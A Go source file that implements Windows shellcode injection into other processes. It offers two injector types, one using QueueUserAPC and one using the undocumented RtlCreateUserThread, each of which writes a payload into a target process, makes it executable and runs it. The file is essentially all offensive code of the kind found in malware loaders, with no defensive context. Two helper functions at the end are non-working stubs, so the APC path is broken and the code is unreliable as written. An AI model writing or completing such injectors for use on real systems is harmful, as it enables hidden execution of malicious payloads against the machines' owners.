package injection

import (
	"fmt"
	"unsafe"
)

type QueueUserAPCInjector struct {
	BaseInjector
}

func NewQueueUserAPCInjector() *QueueUserAPCInjector {
	return &QueueUserAPCInjector{
		BaseInjector: BaseInjector{
			name:        "QueueUserAPC",
			description: "Process injection using QueueUserAPC to execute code when a thread enters an alertable state",
		},
	}
}

func (i *QueueUserAPCInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	threads, err := getProcessThreads(pid)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to get process threads: %v", err)
	}

	if len(threads) == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("no threads found in process")
	}

	
	queuedAPC := false
	for _, threadID := range threads {
		hThread, err := openThread(THREAD_SET_CONTEXT, false, threadID)
		if err != nil {
			continue
		}

		
		result, _, _ := ntQueueApcThread.Call(
			uintptr(hThread),
			uintptr(addr),
			uintptr(0),
			uintptr(0),
			uintptr(0),
		)

		CloseHandle(hThread)

		if result == 0 {
			queuedAPC = true
		}
	}

	if !queuedAPC {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to queue APC to any thread")
	}

	return nil
}

type RtlCreateUserThreadInjector struct {
	BaseInjector
}

func NewRtlCreateUserThreadInjector() *RtlCreateUserThreadInjector {
	return &RtlCreateUserThreadInjector{
		BaseInjector: BaseInjector{
			name:        "RtlCreateUserThread",
			description: "Process injection using the undocumented RtlCreateUserThread API",
		},
	}
}

func (i *RtlCreateUserThreadInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	var hThread HANDLE
	var threadID DWORD
	status, _, _ := rtlCreateUserThread.Call(
		uintptr(hProcess),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(addr),
		uintptr(0),
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(unsafe.Pointer(&threadID)),
	)

	if status != 0 {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("RtlCreateUserThread failed with status: 0x%x", status)
	}
	defer CloseHandle(hThread)

	
	WaitForSingleObject(hThread, INFINITE)

	
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

func getProcessThreads(pid int) ([]DWORD, error) {
	
	
	
	return []DWORD{DWORD(pid)}, nil
}

func openThread(desiredAccess DWORD, inheritHandle bool, threadId DWORD) (HANDLE, error) {
	
	
	
	return HANDLE(threadId), nil
}
